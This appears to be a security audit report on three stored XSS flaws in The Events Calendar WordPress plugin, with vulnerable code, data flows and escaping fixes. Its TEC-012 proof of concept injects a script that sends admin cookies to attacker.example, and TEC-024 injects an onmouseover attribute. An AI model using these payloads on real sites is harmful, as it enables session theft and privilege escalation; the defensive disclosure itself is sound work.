# The Events Calendar — Stored XSS (3 Confirmed Findings)

**Plugin:** The Events Calendar
**Active Installs:** 700,000+
**Confirmed Findings:** 3 (TEC-011, TEC-012, TEC-024)
**Highest CVSS:** 5.4 (Medium)
**Source:** `analysis/phase5_manual/the-events-calendar/confirmed/`

---

!!! warning "Medium Severity — Three Confirmed Stored XSS Vulnerabilities"
    The Events Calendar contains three separate stored XSS vulnerabilities in admin-facing display paths. All three share the root cause: data read from the database (post meta or plugin options) is echoed unescaped inside `<script>` blocks or HTML attribute contexts.

---

## TEC-012: Stored XSS in Post Editor Error Display (CVSS 5.4) — Highest Severity

**Auth Required:** Contributor (to write post meta on their own event posts)
**Victim:** Administrator or Editor who opens the post in the editor
**Source:** `analysis/phase5_manual/the-events-calendar/confirmed/xss-012-post-editor-error.md`

### Vulnerable Code

**File:** `src/Tribe/Admin/Notice/Exceptions/Post_Exception.php`

```php
public static function displayMessage($postId) {
    $error = get_post_meta($postId, '_EventErrorSave', true);
    if (empty($error)) return;
    ?>
    <script>
        jQuery(document).ready(function() {
            jQuery('.tribe-events-header')
                .append('<div class="error"><p><?php echo $error; ?></p></div>');
        });
    </script>
    <?php
}
```

`$error` is echoed without `esc_js()` or any escaping inside a JavaScript string context.

### Data Flow

```
SOURCE: get_post_meta($postId, '_EventErrorSave', true)
  → User-controlled value (Contributor can write meta on their own draft posts)
SINK: echo inside <script> block
  → JavaScript string injection → stored XSS
```

### Attack: Contributor → Admin Privilege Escalation

```bash
# Step 1: Inject XSS payload into post meta (as Contributor)
wp eval '
$postId = wp_insert_post(["post_type" => "tribe_events", "post_title" => "Test", "post_status" => "draft"]);
update_post_meta($postId, "_EventErrorSave", "</script><script>fetch(\"https://attacker.example/steal?c=\"+document.cookie)</script><script>");
echo "Injected on post $postId\n";
'

# Step 2: Wait for admin to open the event post in the editor
# → Admin cookie sent to attacker's server
```

**Fix:** `echo esc_js( $error );`

---

## TEC-011: Stored XSS in Admin Settings Error Display (CVSS 4.8)

**Auth Required:** Administrator (to write the option) / Any admin to trigger
**Victim:** Any administrator visiting The Events Calendar settings page
**Source:** `analysis/phase5_manual/the-events-calendar/confirmed/xss-011-settings-error.md`

### Vulnerable Code

**File:** `src/Tribe/Admin/Notice/Exceptions/Options_Exception.php`

```php
public static function displayMessage() {
    $eventsOptions = Tribe__Settings_Manager::getOptions();
    // ...
    ?>
    <script>
        jQuery(document).ready(function() {
            jQuery('.tribe-settings-form .tribe-events-header')
                .append('<div class="error"><p><?php echo $eventsOptions['error']; ?></p></div>');
        });
    </script>
    <?php
}
```

`$eventsOptions['error']` reads from `get_option('tribe_events_calendar_options')['error']` — unescaped inside a `<script>` block.

### Attack Scenario

An attacker who can write to `tribe_events_calendar_options` (e.g., via a separate vulnerability, compromised admin account, or shared hosting DB access) can persistently inject JavaScript that fires for every admin visiting The Events Calendar settings page.

**Fix:** `echo esc_js( $eventsOptions['error'] );`

---

## TEC-024: Stored XSS in Aggregator Category Dropdown (CVSS 4.8)

**Auth Required:** Administrator (to write aggregator post meta)
**Victim:** Any administrator visiting the Event Aggregator page
**Source:** `analysis/phase5_manual/the-events-calendar/confirmed/xss-024-aggregator-dropdown.md`

### Vulnerable Code

The aggregator import form template echoes `$category_dropdown` without escaping, where the dropdown HTML is constructed using `_default_category` post meta via `preg_replace`:

```php
// Template echoes the constructed dropdown HTML directly
echo $category_dropdown;
// $category_dropdown includes $default_category from post meta without escaping
```

An administrator who can write to aggregator record post meta can inject HTML attributes (e.g., `onmouseover`, `onfocus`) into the rendered dropdown.

### PoC

```bash
wp eval '
$id = wp_insert_post([
    "post_type" => "tribe-ea-record",
    "post_title" => "Test Record",
    "post_status" => "draft"
]);
update_post_meta($id, "_default_category",
    "\" onmouseover=\"alert(document.domain)\" data-x=\"");
echo "Injected on record $id\n";
'
```

**Fix:** Use `esc_attr()` when building dropdown option attributes from stored data.

---

## Common Root Cause

All three TEC vulnerabilities share the same anti-pattern:

```
get_option() / get_post_meta()
  → data echoed WITHOUT escaping
  → inside <script> block or HTML attribute context
```

The fix in every case is to apply the correct WordPress escaping function for the output context:

| Context | Function |
|---------|----------|
| Inside `<script>` JavaScript string | `esc_js()` |
| HTML attribute value | `esc_attr()` |
| HTML text node | `esc_html()` |
| URL in attribute | `esc_url()` |

The WordPress rule — **escape late, at the point of output** — was not followed in these three locations.
